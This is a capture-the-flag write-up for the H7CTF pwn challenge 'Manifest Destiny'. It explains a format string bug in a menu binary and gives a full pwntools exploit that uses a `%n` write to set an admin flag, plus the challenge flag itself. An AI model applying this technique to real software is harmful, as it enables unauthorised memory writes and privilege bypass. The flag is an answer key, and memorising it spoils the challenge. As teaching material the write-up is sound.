# Manifest Destiny — H7CTF (pwn)

> Sparrow Freight keeps its cargo manifest under admin clearance, which is not
> something they planned on giving you. Good thing the terminal loves feedback
> and takes your every word to heart.
>
> Some of us are just destined for management.

**Flag:** `H7CTF{32c1d8cc-8df9-4a60-b266-0d801143764e}`

## Files

| File | Description |
| --- | --- |
| `manifest` | Challenge binary (x86-64, dynamically linked, not stripped) |
| `libc.so.6` | Exact target libc (Ubuntu 24.04, glibc 2.39) |
| `ld-linux-x86-64.so.2` | Matching dynamic loader |
| `solve.py` | Working exploit |

## Binary analysis

```
$ checksec --file=manifest
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Key facts:

- **No PIE** → every address (globals, code) is fixed.
- **No canary** → no stack cookie to leak.
- Non-stripped → easy to read symbol names.

### Program structure

`main` prints a menu and dispatches on `atoi(input)`:

```
1) leave feedback     -> feedback()
2) view manifest      -> view_manifest()
3) exit
```

`view_manifest` (no admin → denied):

```c
void view_manifest(void) {
    if (is_admin == 0) {
        puts("[!] admin clearance required.");
        return;
    }
    FILE *f = fopen("/flag", "r");
    if (!f) { puts("[!] flag file missing"); return; }
    char buf[0x80];
    fgets(buf, 0x80, f);
    fclose(f);
    printf("[manifest] clearance code: %s", buf);
}
```

So we only need the global `is_admin` (at **`0x40407c`**) to be nonzero.

### The bug

`feedback`:

```c
void feedback(void) {
    char buf[0xc8];
    memset(buf, 0, 0xc8);
    puts("Leave feedback for the terminal operators:");
    read(0, buf, 0xc7);
    printf("You said: ");
    printf(buf);          // <-- user input is the format string
    puts("");
}
```

The challenge blurb ("*the terminal loves feedback and takes your every word
to heart*") is the hint: this is a classic **format string** vulnerability.
There is also no stack canary, so even a stack smash / format write is easy.

## Exploitation

### 1. Find the buffer's argument index

Send a marker plus positional `%p`s:

```
AAAA.BBBB|%1$p|%2$p|...|%19$p
```

Output:

```
You said: AAAABBBB.0x7ffe...|(nil)|(nil)|0xa|(nil)|0x4242424241414141|...
                                              ^^^^^^^^^^^^^^^^^^^^^^^^
                                              6th vararg = "AAAABBBB"
```

The feedback buffer starts at printf vararg **6**. Therefore:

- vararg 6 = `buf[0:8]`
- vararg 7 = `buf[8:16]`

### 2. Write to `is_admin`

Use `%n` (writes the number of characters printed so far to a pointer taken
from the argument list). Put the target pointer at `buf[8:16]` so it is vararg 7,
and build an 8-byte prefix so the address lands exactly on a qword boundary:

```
AA%7$nAB  +  p64(0x40407c)
```

- `AA` prints 2 characters → `%7$n` writes `2` to `0x40407c`.
- `is_admin` is now nonzero → admin clearance granted.

The prefix must be **exactly 8 bytes**; otherwise the appended address is
misaligned and `%n` dereferences the wrong value (crash). A common off-by-one
here is `A%7$nAB` (7 bytes).

### 3. Read the manifest

Return to the menu and choose `2`.

## Exploit script

```python
from pwn import *

IS_ADMIN = 0x40407C

p = remote("pwn.h7tex.com", 41949)

p.recvuntil(b"exit\n")                    # main menu
p.sendline(b"1")                          # leave feedback
p.recvuntil(b"operators:\n")

payload = b"AA%7$nAB" + p64(IS_ADMIN)     # is_admin = 2 via %n
p.sendline(payload)

p.recvuntil(b"You said: ")
p.recvuntil(b"\n")
p.recvuntil(b"exit\n")                    # menu returned

p.sendline(b"2")                          # view manifest -> /flag
print(p.recvall(timeout=5).decode())
```

Run it:

```bash
python3 solve.py          # remote
python3 solve.py LOCAL    # local binary + bundled libc
```

Output:

```
[manifest] clearance code: H7CTF{32c1d8cc-8df9-4a60-b266-0d801143764e}
```

## Running locally

To match the live target's libc/offsets:

```bash
./ld-linux-x86-64.so.2 --library-path . ./manifest
# or
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./manifest
```

Locally there is no `/flag`, so after the exploit you will see
`[!] flag file missing` — proof that the `is_admin` check was bypassed.

## Takeaways

- Never pass user input as a format string; use `printf("%s", buf)`.
- Format string bugs allow **arbitrary writes** via `%n`, not just info leaks.
- Complementary weaknesses (no PIE + no canary) make the primitive trivial to
  weaponize against fixed global addresses.
